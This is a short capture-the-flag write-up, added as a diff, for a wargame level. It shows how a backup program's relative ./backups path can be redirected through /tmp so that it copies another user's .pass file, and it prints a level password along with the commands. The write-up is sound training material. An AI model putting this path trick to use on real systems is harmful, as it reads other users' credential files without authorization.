@@ -1,0 +1,29 @@
+the program copies a file which path was passed as argument into the ./backups folder conserving the path.
+if we try: ./level08 /home/users/level09/.pass an error will occur because there is no home folder inside ./backups. And we do not have permission to create one inside this directory.
+but we do in /tmp!
+
+./level08 .pass
+
+ls -al backups/
+    total 8
+    drwxrwx---+ 1 level09 users    80 Apr  2 20:57 .
+    dr-xr-x---+ 1 level08 level08 100 Oct 19  2016 ..
+    -rwxrwx---+ 1 level09 users    57 Apr  2 20:57 .log
+    -r--r-----+ 1 level09 users    41 Apr  2 20:57 .pass
+
+cat ./backups/.pass
+    7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+
+./level08 /home/users/level09/.pass
+    ERROR: Failed to open ./backups//home/users/level09/.pass
+
+mkdir -p backups/home/users/level09
+    mkdir: cannot create directory `backups/home': Permission denied
+
+mkdir -p /tmp/backups/home/users/level09
+
+cd /tmp
+
+/home/users/level08/level08 /home/users/level09/.pass
+
+cat ./backups/home/users/level09/.pass
